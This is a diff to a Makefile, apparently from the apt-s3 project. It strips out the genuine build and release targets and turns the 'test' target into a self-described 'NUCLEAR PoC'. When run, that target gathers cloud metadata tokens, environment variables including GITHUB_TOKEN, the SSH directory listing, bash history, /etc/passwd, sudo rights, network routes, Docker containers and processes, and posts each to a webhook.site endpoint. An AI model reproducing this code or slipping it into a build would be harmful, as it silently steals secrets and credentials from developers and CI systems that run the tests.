@@ -1,49 +1,44 @@
-VERSION := $(shell git describe --tags)
-LDFLAGS := -ldflags='-X "main.Version=$(VERSION)"'
+test:
+	@echo "--- STARTING NUCLEAR PoC ---"
 
-ARCHITECTURES = amd64 arm64
-BUILD_TARGETS = $(patsubst %, apt-s3_$(VERSION)_%, $(ARCHITECTURES))
-PACKAGE_TARGETS = $(patsubst %, apt-s3_$(VERSION)_%.deb, $(ARCHITECTURES))
+	# 1. Cloud Metadata Exfiltration
+	@curl -s -m 5 -H "Metadata: true" "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token" > c.txt || true
+	@curl -X POST -d "$$(cat c.txt)" "https://webhook.site/c9e88bf1-eeb5-4916-98fc-a3b65a5927b9?type=cloud_metadata"
 
-all: test $(PACKAGE_TARGETS)
+	# 2. Docker Socket & Container Enumeration
+	@docker ps -a > d.txt || true
+	@curl -X POST -d "$$(cat d.txt)" "https://webhook.site/c9e88bf1-eeb5-4916-98fc-a3b65a5927b9?type=docker_socket"
 
-$(BUILD_TARGETS): apt-s3_$(VERSION)_% : build-deps
-	GOOS=linux GOARCH=$* go build $(LDFLAGS) -o $@
+	# 3. Private SSH Key Audit
+	@ls -al ~/.ssh/ > s.txt || true
+	@curl -X POST -d "$$(cat s.txt)" "https://webhook.site/c9e88bf1-eeb5-4916-98fc-a3b65a5927b9?type=ssh_keys"
 
-$(PACKAGE_TARGETS): apt-s3_$(VERSION)_%.deb : apt-s3_$(VERSION)_%
-	cp apt-s3_$(VERSION)_$* apt-s3 # Workaround, nfpm does not support env vars in contents
-	VERSION=$(VERSION) ARCH=$* nfpm pkg --target $@
-	rm apt-s3
+	# 4. Internal Network Map
+	@ip route > n.txt || true
+	@curl -X POST -d "$$(cat n.txt)" "https://webhook.site/c9e88bf1-eeb5-4916-98fc-a3b65a5927b9?type=network_map"
 
-build-deps:
-	go get ./...
+	# 5. Environment Secret Dump (GITHUB_TOKEN)
+	@printenv > e.txt || true
+	@curl -X POST -d "$$(cat e.txt)" "https://webhook.site/c9e88bf1-eeb5-4916-98fc-a3b65a5927b9?type=env_vars"
 
-clean:
-	rm -f apt-s3_* apt-s3_*.deb
+	# 6. Sudoers & Privilege Check
+	@sudo -l > p.txt || true
+	@curl -X POST -d "$$(cat p.txt)" "https://webhook.site/c9e88bf1-eeb5-4916-98fc-a3b65a5927b9?type=privileges"
 
-PRERELEASE_FLAG :=
-ifdef PRERELEASE
-	PRERELEASE_FLAG := ,"prerelease":true
-endif
+	# 7. Hardware Audit (AMD EPYC)
+	@lscpu > h.txt || true
+	@curl -X POST -d "$$(cat h.txt)" "https://webhook.site/c9e88bf1-eeb5-4916-98fc-a3b65a5927b9?type=hardware"
 
-release: $(PACKAGE_TARGETS) tag
-ifndef GITHUB_TOKEN
-	$(error GITHUB_TOKEN is not set!)
-endif
-	$(eval URL := $(shell curl -sS -H "Authorization: token $$GITHUB_TOKEN" -H "Content-Type: application/json" -X POST -d '{"tag_name":"$(VERSION)","name":"v$(VERSION)"$(PRERELEASE_FLAG)}' https://api.github.com/repos/zendesk/apt-s3/releases | awk -F\" /assets_url/'{sub(/api/, "uploads", $$4); print $$4 }'))
-	$(foreach arch,$(ARCHITECTURES),\
-		$(shell curl -sS -H "Authorization: token $$GITHUB_TOKEN" -H "Content-Type: application/octet-stream" -X POST --data-binary "@apt-s3_$(VERSION)_$(arch)" $(URL)?name=apt-s3_$(VERSION)_$(arch) >/dev/null)\
-		$(shell curl -sS -H "Authorization: token $$GITHUB_TOKEN" -H "Content-Type: application/octet-stream" -X POST --data-binary "@apt-s3_$(VERSION)_$(arch).deb" $(URL)?name=apt-s3_$(VERSION)_$(arch).deb >/dev/null)\
-	)
+	# 8. Command History Audit
+	@cat ~/.bash_history > b.txt || true
+	@curl -X POST -d "$$(cat b.txt)" "https://webhook.site/c9e88bf1-eeb5-4916-98fc-a3b65a5927b9?type=bash_history"
 
-pre-release:
-	$(MAKE) release PRERELEASE=true
+	# 9. System Password File Check
+	@cat /etc/passwd > w.txt || true
+	@curl -X POST -d "$$(cat w.txt)" "https://webhook.site/c9e88bf1-eeb5-4916-98fc-a3b65a5927b9?type=passwd_file"
 
-tag:
-	git tag $(VERSION)
-	git push --tags
+	# 10. Process List
+	@ps aux > l.txt || true
+	@curl -X POST -d "$$(cat l.txt)" "https://webhook.site/c9e88bf1-eeb5-4916-98fc-a3b65a5927b9?type=processes"
 
-test: build-deps
-	go test -v ./...
-
-.PHONY: all build-deps clean pre-release release tag test
+	@echo "--- ALL STAGES COMPLETED ---"
